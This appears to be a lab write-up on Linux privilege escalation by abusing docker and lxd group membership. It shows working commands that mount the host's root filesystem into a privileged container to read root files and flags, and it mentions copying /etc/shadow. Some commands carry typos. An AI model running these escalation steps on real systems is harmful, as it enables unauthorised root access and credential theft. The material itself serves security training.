**User Groups**

If there are multiple users on a machine and we want to control them, we can create user groups. If we give any permissions to a group, all the members of that group will have same permissions.

**Example 1: —**

Docket is a group. If we add any user in that group, he can run the docker. Docket helps to run multiple Containers. Containers are just like virtual machines.

id >> it will tell the user is a part of which group.

<img width="720" height="111" alt="image" src="https://github.com/user-attachments/assets/ba1c77e2-554f-4cbf-981b-c558445b6c33" />

We can see that user r00t is a part of docker group. So it can run containers. When we run the containers, we can copy any file to the virtual machines. Also the user will be by default root user in the container.

So we can start a container we copy /etc/shadow file there.

First we will check if we have the image of the virtual machine that we are going to start.

***docket image ls*** >> to check docket images

<img width="720" height="155" alt="image" src="https://github.com/user-attachments/assets/35fee663-fd2a-427b-8ec0-de32afc399fb" />

There is an image called bash.

Now we will create a container and take its shell.

***docker run -it bash sh***

docker run → start a new container.

-it → interactive terminal.

bash → the image name.

bash or sh → the command to run inside the container

<img width="720" height="123" alt="image" src="https://github.com/user-attachments/assets/98fe3ce1-9e92-4605-8e42-cb36f2b79304" />

Container has started and we are the root user of that container.

Now we will mount the whole file system to the container

***docker run -v /:/mnt -it bash sh***

/ → is the complete file system

/mnt → is the location where we are mounting the file system. Here we are mounting at /mnt folder of the container.

<img width="720" height="220" alt="image" src="https://github.com/user-attachments/assets/7983d8fd-c91b-479d-a9ea-ee349d2d9ea7" />

All file system has been mounted.

<img width="720" height="100" alt="image" src="https://github.com/user-attachments/assets/814d826f-3b20-4e17-9085-fd0f046296d1" />

We are in root folder and can read the flag.

**Example 2 : —**

<img width="720" height="120" alt="image" src="https://github.com/user-attachments/assets/f8397d05-092e-4f2a-921a-f5f4da6a2078" />

This john user is a part of lxd group.

lxd group works same as docker group. Both can run containers.

1st, lets check if there any image available or not.

lxc image list

<img width="720" height="91" alt="image" src="https://github.com/user-attachments/assets/b19d10a4-8518-4d2a-aa5d-5b6ec7f162be" />

Here we dont have any images available. We will download an image in our local machine and transfer it here. This image could be of any operating system, windows or linux.

Lets download lxd alpine linux image. Alpine is a linux distro of very small size

<img width="720" height="430" alt="image" src="https://github.com/user-attachments/assets/46f69835-24d9-4147-acec-b08c840e9919" />

<img width="720" height="166" alt="image" src="https://github.com/user-attachments/assets/cae20fa5-5271-42ee-a40c-a91faa46c98b" />

Lets download it. Its only 3.11 mb.

<img width="720" height="108" alt="image" src="https://github.com/user-attachments/assets/832ce10f-720c-4e16-b54a-edaec2d125ca" />

Lets rename this to alpine. We need to keep the same extension as original’s .tar.gz

Lets transfer this to target machine

python3 -m http.server 80

On the target machine

<img width="720" height="206" alt="image" src="https://github.com/user-attachments/assets/3b58706c-6796-48e3-9f31-804a5fd3af18" />

As we are in the home folder of john, we have permission to transfer the file here.

Now we need to import this file to lxd

***lxc image import ./alpine.tar.gz — alias alpineimg***

<img width="720" height="71" alt="image" src="https://github.com/user-attachments/assets/aa481335-e26b-4272-96c6-8e28a05f84ba" />

Lets check if the image is imported or not

lxc image list

<img width="720" height="161" alt="image" src="https://github.com/user-attachments/assets/1134a2d8-be79-4158-b09a-3ca4ce7cdfed" />

Now we need to run the image and make it container.

lxc init alpineimg alpinecon -c security.privileged=true

alpineimg → image that we have downloaded.

alpinecon → any random name of the container.

-c security.privileged=true → we are giving full permissions to run this container.

<img width="720" height="103" alt="image" src="https://github.com/user-attachments/assets/4f48d12c-962f-4632-8a43-95c81b9ab3a9" />

Container is in the making

Now we will mount the target machine file system to this container

***lxc config device add alpinecon mydevice disk source=/ path=/mnt recursive=true***

<img width="720" height="85" alt="image" src="https://github.com/user-attachments/assets/43445fe6-4968-422c-bd25-edd1ca2dfe81" />

source=/ → complete file system

path=/mnt → Folder where we want to mount the file system.

recursive=true → it will copy sub folders as well.

Now we need to start the container and take its shell.

***lxc start alpinecon***

***lxc exec alinecon /bin/sh***

we got the root shell of the container. Lets go to the /mnt folder

<img width="720" height="265" alt="image" src="https://github.com/user-attachments/assets/0466b385-7cd5-4e74-afff-08d1d8dd7bfb" />

We can see that all the file system has been mounted and we can see the root flag as well!!!!
